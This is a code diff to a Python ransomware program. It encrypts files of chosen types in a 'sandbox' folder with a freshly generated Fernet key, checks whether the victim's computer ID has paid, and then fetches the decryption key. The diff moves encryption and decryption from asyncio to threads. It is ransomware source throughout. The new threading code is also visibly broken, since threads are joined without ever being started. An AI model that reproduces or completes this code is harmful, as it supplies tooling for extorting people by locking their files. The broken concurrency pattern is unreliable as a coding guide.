@@ -3,9 +3,11 @@
 """System modules"""
 import sys
 import os
+import threading
+
+from wcmatch import glob
 
 from dotenv import load_dotenv
-
 
 # codes line allow to package env in the exe file
 # BUT they can be find easily without encryption of exe
@@ -21,7 +23,6 @@ import time
 import requests
 from cryptography.fernet import Fernet
 from os.path import isfile
-import glob
 import asyncio
 import datetime
 from threading import Thread
@@ -45,10 +46,11 @@ def get_all_files_in_directory(path):
     1) Use Glob to get all the file and return them in array shape
     :param path: the start path
     """
-    return [f for f in glob.glob(path + '/**/*', recursive=True) if isfile(f)]
+    return [f for f in glob.glob(path + '/**/*.{' + os.getenv("FILES_TYPES_TO_ENCRYPT") + '}', flags=glob.BRACE) if
+            isfile(f)]
 
 
-async def main():
+def main():
     """
     This function is the main function
     """
@@ -60,11 +62,22 @@ async def main():
     if get_config_file_info("encrypted") not in TRUE_ALIASES:
         print("-- START OF ENCRYPTION STEP --")
         # -- ENCRYPT MODULE --
+        threads = []
+
         key = Fernet.generate_key()
+
         print("-- KEY GENERATED --")
+
         fernet = Fernet(key)
+
         files = get_all_files_in_directory("sandbox")
-        await asyncio.gather(*[encrypt_file(file, fernet) for file in files])
+
+        for file in files:
+            thread = threading.Thread(target=encrypt_file, args=(file, fernet,))
+            threads.append(thread)
+
+        for thread in threads:
+            thread.join()
         print("-- END OF ENCRYPTION STEP --")
         # -- ENCRYPT MODULE --
 
@@ -114,12 +127,14 @@ def has_paid_checker_module(computer_id: str):
                 key = get_the_decryption_key(computer_id).encode()
                 files = get_all_files_in_directory("sandbox")
                 if key:
-                    loop = asyncio.new_event_loop()
-                    asyncio.set_event_loop(loop)
-                    loop.run_until_complete(
-                        asyncio.gather(*[decrypt_file(file, Fernet(key)) for file in files])
-                    )
-                    loop.close()
+                    threads = []
+                    for file in files:
+                        thread = threading.Thread(target=decrypt_file, args=(file, Fernet(key,)))
+                        threads.append(thread)
+
+                    for thread in threads:
+                        thread.join()
+
                     edit_config_file("has_paid", "True")
                 sys.exit(0)
         except requests.ConnectionError:
